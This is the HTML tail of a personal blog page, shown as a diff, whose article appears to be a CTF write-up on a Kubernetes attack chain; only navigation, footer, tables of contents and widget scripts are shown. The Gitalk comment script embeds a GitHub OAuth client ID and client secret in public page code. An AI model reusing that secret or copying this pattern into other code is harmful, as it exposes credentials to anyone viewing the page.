+        <p><span style="font-weight: bold;">版权声明：</span>本博客所有文章除特别声明外，均采用<a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">CC BY-NC-SA 4.0 协议</a>。转载请注明出处！</p>
+      </div>
+    
+  </div>
+</article>
+<div class="nav">
+  
+    <div class="nav-item-prev">
+      <a 
+        href="/20210429/HFCTF2021-TinyPNG/" 
+        class="nav-link">
+        <i class="iconfont icon-left nav-prev-icon"></i>
+        <div>
+          <div class="nav-label">上一篇</div>
+          
+            <div class="nav-title">HFCTF2021 TinyPNG 复现 </div>
+          
+        </div>
+      </a>
+    </div>
+  
+  
+    <div class="nav-item-next">
+      <a 
+        href="/20201001/hello-world/" 
+        class="nav-link">
+        <div>
+          <div class="nav-label">下一篇</div>
+          
+            <div class="nav-title">Hello World </div>
+          
+        </div>
+        <i class="iconfont icon-right nav-next-icon"></i>
+      </a>
+    </div>
+  
+</div>
+
+  <div 
+    class="card card-content comment-card" 
+    style="margin-top: 16px;">
+    <div class="comment-card-title">评论</div>
+    
+  <div id="gitalk-container"></div>
+  
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+
+  
+<script src="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+
+  
+<script src="/js/lib/md5.min.js"></script>
+
+  <script>
+    var gitalk = new Gitalk({
+      clientID: '032224fa703e5abb2a29',
+      clientSecret: '273bb31dd3a59b6a1ebc4b4e151feb7eb86f801e',
+      repo: 'Liki4.github.io',
+      owner: 'Liki4',
+      admin: ["Liki4"],
+      id: md5(location.pathname),
+      distractionFreeMode: false,
+      language: 'navigator.language || navigator.userLanguage',
+      labels: [],
+      perPage: 10
+    })
+
+    gitalk.render('gitalk-container')
+  </script>
+
+  </div>
+
+<div 
+  class="card card-content toc-card" 
+  id="mobiletoc">
+  <div class="toc-header">
+  <i 
+    class="iconfont icon-menu" 
+    style="padding-right: 2px;">
+  </i>目录
+</div>
+<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-text">前言</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-%E9%A2%98%E7%9B%AE%E5%85%A5%E5%8F%A3%E5%8F%91%E7%8E%B0"><span class="toc-text">0x00 题目入口发现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-wsproxy-%E8%BF%9B%E5%85%A5%E5%86%85%E7%BD%91"><span class="toc-text">0x01 wsproxy 进入内网</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-phpinfo%E6%B3%84%E9%9C%B2k8s%E9%9B%86%E7%BE%A4%E4%BF%A1%E6%81%AF"><span class="toc-text">0x02 phpinfo泄露k8s集群信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-k8s%E5%9F%BA%E7%A1%80%E6%9E%B6%E6%9E%84%E4%BB%8B%E7%BB%8D"><span class="toc-text">0x03 k8s基础架构介绍</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-k8s-%E8%AE%A4%E8%AF%81-token-%E6%B3%84%E9%9C%B2-%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93"><span class="toc-text">0x04 k8s 认证 token 泄露 + 配置不当</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-%E8%8E%B7%E5%8F%96%E9%9B%86%E7%BE%A4%E6%93%8D%E7%BA%B5%E6%9D%83%E9%99%90"><span class="toc-text">0x05 获取集群操纵权限</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x06-%E8%8E%B7%E5%8F%96master-%E5%AE%BF%E4%B8%BB%E6%9C%BA%E6%9D%83%E9%99%90"><span class="toc-text">0x06 获取master 宿主机权限</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x07-%E8%8E%B7%E5%8F%96flag"><span class="toc-text">0x07 获取flag</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x08-%E6%80%BB%E7%BB%93"><span class="toc-text">0x08 总结</span></a></li></ol></li></ol>
+</div></main>
+            <aside class="left-column">
+              
+              <div class="card card-author">
+                
+  <img 
+    src="/img/Liki4.jpg" 
+    class="author-img" 
+    alt="author avatar">
+
+<p class="author-name">Switch</p>
+<p class="author-description">HDU | Vidar-Team | Web</p>
+<div class="author-message">
+  <a 
+    class="author-posts-count" 
+    href="/archives">
+    <span>8</span>
+    <span>文章</span>
+  </a>
+  <a 
+    class="author-categories-count" 
+    href="/categories">
+    <span>0</span>
+    <span>分类</span>
+  </a>
+  <a 
+    class="author-tags-count" 
+    href="/tags">
+    <span>2</span>
+    <span>标签</span>
+  </a>
+</div>
+
+  <div class="author-card-society">
+    
+      <div class="author-card-society-icon">
+        <a target="_blank" rel="noopener" href="https://github.com/Liki4">
+          <i class="iconfont icon-github society-icon"></i>
+        </a>
+      </div>
+    
+      <div class="author-card-society-icon">
+        <a href="mailto:chrislikaiyuan@outlook.com">
+          <i class="iconfont icon-mail society-icon"></i>
+        </a>
+      </div>
+    
+  </div>
+
+              </div>
+               <div class="sticky-tablet">
+  
+  
+    <article class="display-when-two-columns spacer">
+      <div class="card card-content toc-card">
+        <div class="toc-header">
+  <i 
+    class="iconfont icon-menu" 
+    style="padding-right: 2px;">
+  </i>目录
+</div>
+<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-text">前言</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-%E9%A2%98%E7%9B%AE%E5%85%A5%E5%8F%A3%E5%8F%91%E7%8E%B0"><span class="toc-text">0x00 题目入口发现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-wsproxy-%E8%BF%9B%E5%85%A5%E5%86%85%E7%BD%91"><span class="toc-text">0x01 wsproxy 进入内网</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-phpinfo%E6%B3%84%E9%9C%B2k8s%E9%9B%86%E7%BE%A4%E4%BF%A1%E6%81%AF"><span class="toc-text">0x02 phpinfo泄露k8s集群信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-k8s%E5%9F%BA%E7%A1%80%E6%9E%B6%E6%9E%84%E4%BB%8B%E7%BB%8D"><span class="toc-text">0x03 k8s基础架构介绍</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-k8s-%E8%AE%A4%E8%AF%81-token-%E6%B3%84%E9%9C%B2-%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93"><span class="toc-text">0x04 k8s 认证 token 泄露 + 配置不当</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-%E8%8E%B7%E5%8F%96%E9%9B%86%E7%BE%A4%E6%93%8D%E7%BA%B5%E6%9D%83%E9%99%90"><span class="toc-text">0x05 获取集群操纵权限</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x06-%E8%8E%B7%E5%8F%96master-%E5%AE%BF%E4%B8%BB%E6%9C%BA%E6%9D%83%E9%99%90"><span class="toc-text">0x06 获取master 宿主机权限</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x07-%E8%8E%B7%E5%8F%96flag"><span class="toc-text">0x07 获取flag</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x08-%E6%80%BB%E7%BB%93"><span class="toc-text">0x08 总结</span></a></li></ol></li></ol>
+      </div>
+    </article>
+  
+  
+  <article class="card card-content categories-widget">
+    <div class="categories-card">
+  <div class="categories-header">
+    <i 
+      class="iconfont icon-fenlei" 
+      style="padding-right: 2px;">
+    </i>分类
+  </div>
+  <div class="categories-list">
+    
+  </div>
+</div>
+  </article>
+  
+  <article class="card card-content tags-widget">
+    <div class="tags-card">
+  <div class="tags-header">
+    <i 
+      class="iconfont icon-biaoqian" 
+      style="padding-right: 2px;">
+    </i>热门标签
+  </div>
+  <div class="tags-list">
+    
+      <a 
+        href="/tags/CTF-WriteUp/" 
+        title="CTF WriteUp">
+        <div class="tags-list-item">CTF WriteUp</div>
+      </a>
+    
+      <a 
+        href="/tags/dn42/" 
+        title="dn42">
+        <div class="tags-list-item">dn42</div>
+      </a>
+    
+  </div>
+</div>
+  </article>
+  
+  
+</div>
+            </aside>
+            <aside class="right-column">
+              <div class="sticky-widescreen">
+  
+  
+    <article class="card card-content toc-card">
+      <div class="toc-header">
+  <i 
+    class="iconfont icon-menu" 
+    style="padding-right: 2px;">
+  </i>目录
+</div>
+<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-text">前言</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-%E9%A2%98%E7%9B%AE%E5%85%A5%E5%8F%A3%E5%8F%91%E7%8E%B0"><span class="toc-text">0x00 题目入口发现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-wsproxy-%E8%BF%9B%E5%85%A5%E5%86%85%E7%BD%91"><span class="toc-text">0x01 wsproxy 进入内网</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-phpinfo%E6%B3%84%E9%9C%B2k8s%E9%9B%86%E7%BE%A4%E4%BF%A1%E6%81%AF"><span class="toc-text">0x02 phpinfo泄露k8s集群信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-k8s%E5%9F%BA%E7%A1%80%E6%9E%B6%E6%9E%84%E4%BB%8B%E7%BB%8D"><span class="toc-text">0x03 k8s基础架构介绍</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-k8s-%E8%AE%A4%E8%AF%81-token-%E6%B3%84%E9%9C%B2-%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93"><span class="toc-text">0x04 k8s 认证 token 泄露 + 配置不当</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-%E8%8E%B7%E5%8F%96%E9%9B%86%E7%BE%A4%E6%93%8D%E7%BA%B5%E6%9D%83%E9%99%90"><span class="toc-text">0x05 获取集群操纵权限</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x06-%E8%8E%B7%E5%8F%96master-%E5%AE%BF%E4%B8%BB%E6%9C%BA%E6%9D%83%E9%99%90"><span class="toc-text">0x06 获取master 宿主机权限</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x07-%E8%8E%B7%E5%8F%96flag"><span class="toc-text">0x07 获取flag</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x08-%E6%80%BB%E7%BB%93"><span class="toc-text">0x08 总结</span></a></li></ol></li></ol>
+    </article>
+  
+  
+  <article class="card card-content">
+    <div class="recent-posts-card">
+  <div class="recent-posts-header">
+    <i 
+      class="iconfont icon-wenzhang_huaban" 
+      style="padding-right: 2px;">
+    </i>最近文章
+  </div>
+  <div class="recent-posts-list">
+    
+      <div class="recent-posts-item">
+        <div class="recent-posts-item-title">2077-03-02</div>
+        <a href="/20770302/DN42/"><div class="recent-posts-item-content">DN42</div></a>
+      </div>
+    
+      <div class="recent-posts-item">
+        <div class="recent-posts-item-title">2021-10-18</div>
+        <a href="/20211018/ByteCTF-2021-Web-WP/"><div class="recent-posts-item-content">ByteCTF 2021 Web WP</div></a>
+      </div>
+    
+      <div class="recent-posts-item">
+        <div class="recent-posts-item-title">2021-08-12</div>
+        <a href="/20210812/Web-%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE/"><div class="recent-posts-item-content">Web 安全基础知识思维导图</div></a>
+      </div>
+    
+      <div class="recent-posts-item">
+        <div class="recent-posts-item-title">2021-08-12</div>
+        <a href="/20210812/HTTPS-%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/"><div class="recent-posts-item-content">HTTPS 协议学习</div></a>
+      </div>
+    
+  </div>
+</div>
+  </article>
+  
+  
+</div>
+            </aside>
+          </div>
+        </div>
+      </div>
+    </div>
+     
+    <footer class="footer">
+  <div class="footer-container">
+    <div>
+      <div class="footer-dsc">
+        <span>
+          Copyright ©
+          
+            2020 -
+          
+          2021
+        </span>
+        &nbsp;
+        <a 
+          href="/" 
+          class="footer-link">
+          Liki4
+        </a>
+      </div>
+    </div>
+
+    
+      <div class="footer-dsc">
+        
+          Powered by
+          <a 
+            href="https://hexo.io/" 
+            class="footer-link" 
+            target="_blank" 
+            rel="nofollow noopener noreferrer">
+            &nbsp;Hexo
+          </a>
+        
+        
+          <span>&nbsp;|&nbsp;</span>
+        
+        
+          Theme -
+          <a 
+            href="https://github.com/theme-kaze" 
+            class="footer-link" 
+            target="_blank"
+            rel="nofollow noopener noreferrer">
+            &nbsp;Kaze
+          </a>
+        
+      </div>
+    
+    
+    
+    
+      <div class="footer-dsc">
+        
+          本站总访问量<span id="busuanzi_value_site_pv"></span>次
+        
+        
+          <span>&nbsp;|&nbsp;</span>
+        
+        
+          本站总访客数<span id="busuanzi_value_site_uv"></span>次
+        
+      </div>
+      
+    
+</footer> 
+    
+  <a 
+    role="button" 
+    id="scrollbutton" 
+    class="basebutton" 
+    aria-label="回到顶部">
+    <i class="iconfont icon-arrowleft button-icon"></i>
+  </a>
+
+<a 
+  role="button" 
+  id="menubutton" 
+  class="basebutton">
+  <i class="iconfont icon-menu button-icon"></i>
+</a>
+<a 
+  role="button" 
+  id="popbutton" 
+  class="basebutton" 
+  aria-label="控制中心">
+  <i class="iconfont icon-expand button-icon"></i>
+</a>
+<a 
+  role="button" 
+  id="darkbutton" 
+  class="basebutton darkwidget" 
+  aria-label="夜色模式">
+  <i class="iconfont icon-weather button-icon"></i>
+</a>
+<a 
+  role="button" 
+  id="searchbutton" 
+  class="basebutton searchwidget" 
+  aria-label="搜索">
+  <i class="iconfont icon-search button-icon"></i>
+</a> 
+     
+     
+     
+      <script>
+  var addImgLayout = function () {
+    var img = document.querySelectorAll('.post-content img')
+    var i
+    for (i = 0; i < img.length; i++) {
+      var wrapper = document.createElement('a')
+      wrapper.setAttribute('href', img[i].getAttribute('data-src'))
+      wrapper.setAttribute('aria-label', 'illustration')
+      wrapper.style.cssText =
+        'width: 100%; display: flex; justify-content: center;'
+      if (img[i].alt) wrapper.dataset.caption = img[i].alt
+      wrapper.dataset.nolink = true
+      img[i].before(wrapper)
+      wrapper.append(img[i])
+      var divWrap = document.createElement('div')
+      divWrap.classList.add('gallery')
+      wrapper.before(divWrap)
+      divWrap.append(wrapper)
+    }
+    baguetteBox.run('.gallery')
+  }
+</script>
+<script>
+  loadScript(
+    "/js/lib/lightbox/baguetteBox.min.js",
+    addImgLayout
+  )
+</script>
+ 
+     
+     
+    <script src="/js/main.js"></script> 
+    
+      <script> 
+        loadScript('/js/lib/busuanzi.min.js') 
+      </script>
+     
+    
+      <script>
+        var addLazyload = function () {
+          var observer = lozad('.lozad', {
+            load: function (el) {
+              el.srcset = el.getAttribute('data-src')
+            },
+            loaded: function (el) {
+              el.classList.add('loaded')
+            },
+          })
+          observer.observe()
+        }
+      </script>
+      <script>
+        loadScript('/js/lib/lozad.min.js', addLazyload)
+      </script>
+     
+    
+    
+      <script>
+        setTimeout(() => {localSearch("search.json")}, 0)
+      </script>
+    
+  </body>
+</html>
